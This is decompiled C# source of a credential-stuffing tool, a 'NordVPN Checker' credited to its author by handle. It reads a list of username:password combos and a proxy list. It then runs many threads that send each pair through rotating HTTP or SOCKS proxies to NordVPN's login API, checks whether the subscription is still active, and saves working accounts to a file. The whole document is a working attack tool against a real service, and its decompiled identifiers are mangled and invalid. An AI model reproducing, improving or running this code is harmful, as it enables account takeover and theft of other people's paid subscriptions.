using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Colorful;
using Leaf.xNet;

namespace 1
{
	// Token: 0x02000002 RID: 2
	internal class 2
	{
		// Token: 0x06000001 RID: 1 RVA: 0x0000208C File Offset: 0x0000028C
		[STAThread]
		private static void ?7?(string[] ?16?)
		{
			?2?.?5? ?5? = new ?2?.?5?();
			ServicePointManager.DefaultConnectionLimit = 100000000;
			Colorful.Console.SetWindowSize(35, 35);
			Colorful.Console.Title = "NordVPN Checker | Made By Spxrkz#7516 |";
			System.Console.Clear();
			Colorful.Console.WriteLine();
			System.Console.Clear();
			Colorful.Console.Write("         ███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ███╗   ██╗  \n", Color.Red);
			Colorful.Console.Write("         ████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║  \n", Color.Green);
			Colorful.Console.Write("         ██╔██╗ ██║██║   ██║██████╔╝██║  ██║██║   ██║██████╔╝██╔██╗ ██║     \n", Color.Red);
			Colorful.Console.Write("         ██║╚██╗██║██║   ██║██╔══██╗██║  ██║╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║     \n", Color.Green);
			Colorful.Console.Write("         ██║ ╚████║╚██████╔╝██║  ██║██████╔╝ ╚████╔╝ ██║     ██║ ╚████║      \n", Color.Red);
			Colorful.Console.Write("         ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝     ╚═╝  ╚═══╝       \n", Color.Green);
			System.Console.WriteLine("                            Made By Spxrkz#7516                 ");
			System.Console.WriteLine(" ════════════════════════════════╦════════════════════════════════╦═══════════════════════════════                                    ");
			System.Console.WriteLine("║       [+] Tool Info [+]        ║        [+] News [+]            ║     [+] Checker Info [+]      ║            ");
			System.Console.WriteLine("║   -Best Nord Account Checker   ║   -Updated Checker 2020 API    ║ -Total Accounts Checked +100K ║            ");
			System.Console.WriteLine("  ═══════════════════════════════╩════════════════════════════════╩═══════════════════════════════");
			System.Console.WriteLine("                                          ");
			System.Console.WriteLine("                                          ");
			Thread.Sleep(250);
			Colorful.Console.Write("> How Much ", Color.Red);
			Colorful.Console.Write("Threads ", Color.Green);
			Colorful.Console.Write(" Press Enter | Starts Auto-Checker", Color.Red);
			Colorful.Console.Write(": ", Color.Green);
			?5?.?45? = int.Parse(Colorful.Console.ReadLine());
			for (;;)
			{
				Colorful.Console.Write("> What Type Of ", Color.Red);
				Colorful.Console.Write("PROXIES ", Color.Green);
				Colorful.Console.Write("HTTP, SOCKS4, SOCKS5", Color.Red);
				Colorful.Console.Write(": ", Color.Green);
				?2?.?37? = Colorful.Console.ReadLine();
				?2?.?37? = ?2?.?37?.ToUpper();
				if (?2?.?37?.Contains("HTTP"))
				{
					goto IL_224;
				}
				if (?2?.?37?.Contains("SOCKS4"))
				{
					goto IL_224;
				}
				int num = (!?2?.?37?.Contains("SOCKS5")) ? 1 : 0;
				IL_225:
				bool flag = num != 0;
				if (flag)
				{
					Colorful.Console.Write("> Please Pick A Valid Proxy Format.\n\n", Color.Red);
					Thread.Sleep(2000);
					continue;
				}
				break;
				IL_224:
				num = 0;
				goto IL_225;
			}
			Task.Factory.StartNew(new Action(?2?.?6?.?46?.?15?));
			Task.Factory.StartNew(new Action(?5?.?14?));
			Colorful.Console.WriteLine();
			string fileName;
			do
			{
				Colorful.Console.WriteLine("Select your Combos", Color.Lime);
				Thread.Sleep(500);
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Title = "Select Combo List";
				openFileDialog.DefaultExt = "txt";
				openFileDialog.Filter = "Text files|*.txt";
				openFileDialog.RestoreDirectory = true;
				int num2 = (int)openFileDialog.ShowDialog();
				fileName = openFileDialog.FileName;
			}
			while (!File.Exists(fileName));
			?2?.?41? = new List<string>(File.ReadAllLines(fileName));
			using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream = new BufferedStream(fileStream))
				{
					using (StreamReader streamReader = new StreamReader(bufferedStream))
					{
						while (streamReader.ReadLine() != null)
						{
							?2?.?33?++;
						}
					}
				}
			}
			Colorful.Console.Write("> ");
			Colorful.Console.Write(?2?.?33?, Color.Aquamarine);
			Colorful.Console.WriteLine(" Combos added\n");
			string fileName2;
			do
			{
				Colorful.Console.WriteLine("Select your Proxies", Color.Lime);
				Thread.Sleep(500);
				OpenFileDialog openFileDialog2 = new OpenFileDialog();
				openFileDialog2.Title = "Select Proxy List";
				openFileDialog2.DefaultExt = "txt";
				openFileDialog2.Filter = "Text files|*.txt";
				openFileDialog2.RestoreDirectory = true;
				int num3 = (int)openFileDialog2.ShowDialog();
				fileName2 = openFileDialog2.FileName;
			}
			while (!File.Exists(fileName2));
			?2?.?36? = new List<string>(File.ReadAllLines(fileName2));
			using (FileStream fileStream2 = File.Open(fileName2, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (BufferedStream bufferedStream2 = new BufferedStream(fileStream2))
				{
					using (StreamReader streamReader2 = new StreamReader(bufferedStream2))
					{
						while (streamReader2.ReadLine() != null)
						{
							?2?.?39?++;
						}
					}
				}
			}
			Colorful.Console.Write("> ");
			Colorful.Console.Write(?2?.?39?, Color.Aquamarine);
			Colorful.Console.WriteLine(" Proxies added\n");
			for (int i = 1; i <= ?5?.?45?; i++)
			{
				new Thread(new ThreadStart(?2?.?8?)).Start();
			}
			Colorful.Console.ReadLine();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000026F4 File Offset: 0x000008F4
		public static void ?8?()
		{
			for (;;)
			{
				bool flag = ?2?.?38? > ?2?.?36?.Count<string>() - 2;
				if (flag)
				{
					goto IL_46C;
				}
				IL_44:
				try
				{
					Interlocked.Increment(ref ?2?.?38?);
					using (HttpRequest httpRequest = new HttpRequest())
					{
						bool flag2 = ?2?.?35? >= ?2?.?41?.Count<string>();
						if (flag2)
						{
							?2?.?40?++;
							break;
						}
						Interlocked.Increment(ref ?2?.?35?);
						string[] array = ?2?.?41?[?2?.?35?].Split(new char[]
						{
							':'
						});
						string text = array[0] + ":" + array[1];
						try
						{
							httpRequest.IgnoreProtocolErrors = true;
							httpRequest.KeepAlive = true;
							bool flag3 = ?2?.?37? == "HTTP";
							if (flag3)
							{
								httpRequest.Proxy = HttpProxyClient.Parse(?2?.?36?[?2?.?38?]);
							}
							bool flag4 = ?2?.?37? == "SOCKS4";
							if (flag4)
							{
								httpRequest.Proxy = Socks4ProxyClient.Parse(?2?.?36?[?2?.?38?]);
							}
							bool flag5 = ?2?.?37? == "SOCKS5";
							if (flag5)
							{
								httpRequest.Proxy = Socks5ProxyClient.Parse(?2?.?36?[?2?.?38?]);
							}
							httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
							httpRequest.AddHeader("Accept", "*/*");
							string text2 = httpRequest.Post("https://api.nordvpn.com/v1/users/tokens", string.Concat(new string[]
							{
								"{\"username\":\"",
								array[0],
								"\",\"password\":\"",
								array[1],
								"\"}"
							}), "application/json").ToString();
							bool flag6 = text2.Contains("user_id\":");
							if (flag6)
							{
								string str = ?2?.?10?("token:" + ?3?.?11?(text2, "token\":\"", "\"", false, false));
								httpRequest.AddHeader("Authorization", "Basic " + str);
								bool flag7 = DateTime.Compare(Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")), Convert.ToDateTime(?3?.?11?(httpRequest.Get("https://api.nordvpn.com/v1/users/services", null).ToString(), "expires_at\":\"", "\"", false, false))) < 0;
								if (flag7)
								{
									?2?.?43?++;
									?2?.?34?++;
									?2?.?31?++;
									Colorful.Console.WriteLine("[GOOD] " + text, Color.Lime);
									?2?.?44? = ?2?.?44? + text + "\n";
									continue;
								}
								?2?.?43?++;
								?2?.?34?++;
								?2?.?30?++;
								Colorful.Console.WriteLine("[BAD] " + text, Color.Red);
								continue;
							}
							else
							{
								bool flag8 = text2.Contains("code\":101301");
								if (flag8)
								{
									?2?.?43?++;
									?2?.?34?++;
									?2?.?29?++;
									Colorful.Console.WriteLine("[BAD] " + text, Color.DarkRed);
									continue;
								}
								bool flag9 = text2.Contains("message\":\"Unauthorized");
								if (flag9)
								{
									?2?.?43?++;
									?2?.?34?++;
									?2?.?29?++;
									Colorful.Console.WriteLine("[BAD] " + text, Color.DarkRed);
									continue;
								}
								?2?.?32?++;
								?2?.?41?.Add(text);
								continue;
							}
						}
						catch (Exception ex)
						{
							?2?.?41?.Add(text);
							Interlocked.Increment(ref ?2?.?32?);
							continue;
						}
					}
				}
				catch (Exception ex2)
				{
					Interlocked.Increment(ref ?2?.?32?);
					continue;
				}
				IL_46C:
				?2?.?38? = 0;
				goto IL_44;
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002050 File Offset: 0x00000250
		public static void ?9?(object ?17?, ElapsedEventArgs ?18?)
		{
			?2?.?42? = ?2?.?43?;
			?2?.?43? = 0;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002BE4 File Offset: 0x00000DE4
		public static string ?10?(string ?19?)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(?19?));
		}

		// Token: 0x04000001 RID: 1
		public static int ?29? = 0;

		// Token: 0x04000002 RID: 2
		public static int ?30? = 0;

		// Token: 0x04000003 RID: 3
		public static int ?31? = 0;

		// Token: 0x04000004 RID: 4
		public static int ?32? = 0;

		// Token: 0x04000005 RID: 5
		public static int ?33? = 0;

		// Token: 0x04000006 RID: 6
		public static int ?34? = 0;

		// Token: 0x04000007 RID: 7
		public static int ?35? = 0;

		// Token: 0x04000008 RID: 8
		public static List<string> ?36? = new List<string>();

		// Token: 0x04000009 RID: 9
		public static string ?37? = "";

		// Token: 0x0400000A RID: 10
		public static int ?38? = 0;

		// Token: 0x0400000B RID: 11
		public static int ?39? = 0;

		// Token: 0x0400000C RID: 12
		public static int ?40? = 0;

		// Token: 0x0400000D RID: 13
		public static List<string> ?41? = new List<string>();

		// Token: 0x0400000E RID: 14
		public static int ?42? = 0;

		// Token: 0x0400000F RID: 15
		public static int ?43? = 0;

		// Token: 0x04000010 RID: 16
		public static string ?44?;

		// Token: 0x02000003 RID: 3
		public static class ?4?
		{
			// Token: 0x06000007 RID: 7 RVA: 0x00002C88 File Offset: 0x00000E88
			public static int ?13?(string ?27?, string ?28?)
			{
				int num = 0;
				int startIndex = 0;
				int num2;
				while ((num2 = ?27?.IndexOf(?28?, startIndex)) != -1)
				{
					startIndex = num2 + ?28?.Length;
					num++;
				}
				return num;
			}
		}

		// Token: 0x02000004 RID: 4
		[CompilerGenerated]
		private sealed class ?5?
		{
			// Token: 0x06000009 RID: 9 RVA: 0x00002CE8 File Offset: 0x00000EE8
			internal void ?14?()
			{
				while (((?2?.?40? == this.?45?) ? 0 : ((?2?.?40? - 1 != this.?45? - 1) ? 1 : 0)) != 0)
				{
					bool flag = ?2?.?44? != ?48?.?49?("");
					if (flag)
					{
						File.AppendAllText(?48?.?49?("@ŮɲͶЪշٺݵ"), ?2?.?44?);
					}
					?2?.?44? = ?48?.?49?("");
					Thread.Sleep(1500);
				}
				Colorful.Console.WriteLine(?48?.?49?("\u0002ĹȦ́ѫխ٧ܯ"), Color.White);
				Thread.Sleep(100000000);
				Environment.Exit(0);
			}

			// Token: 0x04000011 RID: 17
			public int ?45?;
		}

		// Token: 0x02000005 RID: 5
		[CompilerGenerated]
		[Serializable]
		private sealed class ?6?
		{
			// Token: 0x0600000C RID: 12 RVA: 0x00002DE8 File Offset: 0x00000FE8
			internal void ?15?()
			{
				for (;;)
				{
					?2?.?42? = ?2?.?43?;
					?2?.?43? = 0;
					Colorful.Console.Title = string.Format(?48?.?49?("\u0001ġȿ̨НԚ؇ݨࠄमਠଧనധำའ၃ᄞቾፔᑞᕙᙒ᝝ᡓᤌᨕ᭏ᰃᵏḞὋ„⅓∍⍐␋╢♀❜⡔⤜⨅⭟Ⱁⵟ⸁⽜〿ㅜ㉼㍸㐡㔺㙢㜫㡪㤶㩩㬴㱖㵠㹣㽿䁽䅽䈷䌬䑰䔿䙴䜨䡻䤦䩆䭔䱎䴸両"), new object[]
					{
						?2?.?34?,
						?2?.?33?,
						?2?.?31?,
						?2?.?29?,
						?2?.?30?,
						?2?.?32?
					}) + (?2?.?42? * 60).ToString();
					Thread.Sleep(1000);
				}
			}

			// Token: 0x04000012 RID: 18
			public static readonly ?2?.?6? ?46? = new ?2?.?6?();

			// Token: 0x04000013 RID: 19
			public static Action ?47?;
		}
	}
}
